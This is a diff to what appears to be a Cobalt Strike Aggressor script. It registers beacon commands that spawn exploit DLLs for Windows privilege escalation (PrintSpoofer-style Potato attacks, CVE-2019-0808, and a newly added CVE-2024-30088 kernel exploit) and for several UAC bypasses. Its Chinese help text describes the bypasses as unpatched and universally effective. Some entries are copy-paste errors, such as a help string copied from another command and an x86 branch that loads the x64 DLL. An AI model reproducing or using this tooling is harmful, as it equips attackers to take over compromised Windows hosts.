@@ -1,3 +1,19 @@
+alias test {
+
+    if (-is64 $1)
+    {
+        $arch = "x64";
+        $archdll = script_resource("test.dll");
+    } else {
+        $arch = "x86";
+        $archdll = script_resource("test.dll");
+    }
+
+    bdllspawn($1, $archdll,$2, "test", 999999, false);
+}
+
+beacon_command_register("test", "测试dll，弹一个窗", "测试dll，弹一个窗");
+
 alias PipePotato {
 
     if (-is64 $1)
@@ -12,7 +28,7 @@ alias PipePotato {
     bdllspawn($1, $archdll, $2, "no", 999999, false);
 }
 
-beacon_command_register("PipePotato", "PrintSpoofer Privilege Escalation. Windows 10 and above are recommended". "PrintSpoofer Privilege Escalation. \n\n usage:PipePotato c:\\a.exe");
+beacon_command_register("PipePotato", "PrintSpoofer提权，推荐使用，后面跟要运行的exe全路径", "PrintSpoofer提权，后面跟要运行的exe全路径\n\n 使用说明:pipePotato c:\\a.exe");
 
 
 alias RasmanPotato {
@@ -29,7 +45,7 @@ alias RasmanPotato {
     bdllspawn($1, $archdll, $2, "test", 999999, false);
 }
 
-beacon_command_register("RasmanPotato", "RasmanPotato Privilege Escalation", "RasmanPotato Privilege Escalation. \n\n usage:RasmanPotato c:\\a.exe");
+beacon_command_register("RasmanPotato", "RasmanPotato提权，后面跟要运行的exe全路径和利用模式", "PrintSpoofer提权，后面跟要运行的exe全路径\n\n 使用说明:pipePotato c:\\a.exe");
 
 
 alias CVE-2019-0808 {
@@ -46,7 +62,24 @@ alias CVE-2019-0808 {
     bdllspawn($1, $archdll, $2, "test", 999999, false);
 }
 
-beacon_command_register("CVE-2019-0808", "CVE-2019-0808 Privilege Escalation,Windows 7 is recommended", "CVE-2019-0808 Privilege Escalation.\n\n  usage:CVE-2019-0808 c:\\a.exe");
+beacon_command_register("CVE-2019-0808", "CVE-2019-0808提权，后面跟要运行的exe全路径和利用模式", "CVE-2019-0808提权，后面跟要运行的exe全路径\n\n 使用说明:CVE-2019-0808 c:\\a.exe");
+
+
+alias CVE-2024-30088 {
+
+    if (-is64 $1)
+    {
+        $arch = "x64";
+        $archdll = script_resource("CVE-2024-30088-x64.dll");
+    } else {
+        $arch = "x86";
+        $archdll = script_resource("CVE-2024-30088-x64.dll");
+    }
+
+    bdllspawn($1, $archdll, $2, "test", 999999, false);
+}
+
+beacon_command_register("CVE-2024-30088", "CVE-2024-30088内核提权，适用于win10以上，这个利用大概会延迟1分钟。", "CVE-2024-30088内核提权，适用于win10以上，这个利用大概会延迟1分钟。后面跟要运行的exe全路径\n\n 使用说明:CVE-2024-30088 c:\\a.exe");
 
 
 alias BypassUAC-CMLuaUtil {
@@ -63,7 +96,7 @@ alias BypassUAC-CMLuaUtil {
     bdllspawn($1, $archdll, $2, "test", 999999, false);
 }
 
-beacon_command_register("BypassUAC-CMLuaUtil", "UACME No.41,bypassuac via com component CMLuaUtil", "bypassuac via com component CMLuaUtil,Microsoft not fixed. \n\n usage: BypassUAC-CMLuaUtil c:\\a.exe");
+beacon_command_register("BypassUAC-CMLuaUtil", "No.41,通过com组件CMLuaUtil进行bypassuac,该利用方式可以通杀", "通过com组件CMLuaUtil进行bypassuac,未被微软修复，后面跟要运行的exe全路径\n\n");
 
 
 alias BypassUAC-ShellRegMod {
@@ -80,7 +113,7 @@ alias BypassUAC-ShellRegMod {
     bdllspawn($1, $archdll, $2, "test", 999999, false);
 }
 
-beacon_command_register("BypassUAC-ShellRegMod", "UACME No.33,Using the registry bypassuac via fodhelper and computerdefault", "bypassuac via fodhelper and computerdefault registry, Microsoft not fixed.\n\n usage: BypassUAC-ShellRegMod c:\\a.exe");
+beacon_command_register("BypassUAC-ShellRegMod", "No.33,该利用方式可以通杀", "通过fodhelper和computerdefault使用注册表进行bypassuac,未被微软修复，后面跟要运行的exe全路径\n\n");
 
 
 alias BypassUAC-ShellRegMod2 {
@@ -97,7 +130,7 @@ alias BypassUAC-ShellRegMod2 {
     bdllspawn($1, $archdll, $2, "test", 999999, false);
 }
 
-beacon_command_register("BypassUAC-ShellRegMod2", "UACME No.61&53,bypassuac via slui and sdclt registry", "Use the registry slui and sdclt bypassUAC,Microsoft not fixed. \n\n usage: BypassUAC-ShellRegMod2 c:\\a.exe");
+beacon_command_register("BypassUAC-ShellRegMod2", "No.61&53,注册表利用方式,该利用方式可以通杀", "通过slui和sdclt进行bypassuac,未被微软修复，后面跟要运行的exe全路径\n\n");
 
 
 alias BypassUAC-ShellRegMod3 {
@@ -114,7 +147,7 @@ alias BypassUAC-ShellRegMod3 {
     bdllspawn($1, $archdll, $2, "test", 999999, false);
 }
 
-beacon_command_register("BypassUAC-ShellRegMod3", "UACME No.70,Similar to BypassUAC-ShellRegMod", "Similar to BypassUAC-ShellRegMod ,Microsoft not fixed. \n\n usage: BypassUAC-ShellRegMod3 c:\\a.exe");
+beacon_command_register("BypassUAC-ShellRegMod3", "No.70,注册表利用方式,该利用方式可以通杀", "和BypassUAC-ShellRegMod类似,未被微软修复，后面跟要运行的exe全路径\n\n");
 
 
 alias BypassUAC-DccwCOM {
@@ -131,4 +164,22 @@ alias BypassUAC-DccwCOM {
     bdllspawn($1, $archdll, $2, "test", 999999, false);
 }
 
-beacon_command_register("BypassUAC-DccwCOM", "No.43,bypassuac via DccwCOM " "bypassuac via DccwCOM,Microsoft not fixed. \n\n usage: BypassUAC-DccwCOM c:\\a.exe");
+beacon_command_register("BypassUAC-DccwCOM", "No.43,com组件利用方式,该利用方式可以通杀", "未被微软修复，后面跟要运行的exe全路径\n\n");
+
+
+alias BypassUAC-test {
+
+    if (-is64 $1)
+    {
+        $arch = "x64";
+        $archdll = script_resource("UAC-1.dll");
+    } else {
+        $arch = "x86";
+        $archdll = script_resource("UAC-1.dll");
+    }
+
+    bdllspawn($1, $archdll, $2, "test", 999999, false);
+}
+
+beacon_command_register("BypassUAC-test", "test", "未被微软修复，后面跟要运行的exe全路径\n\n");
+
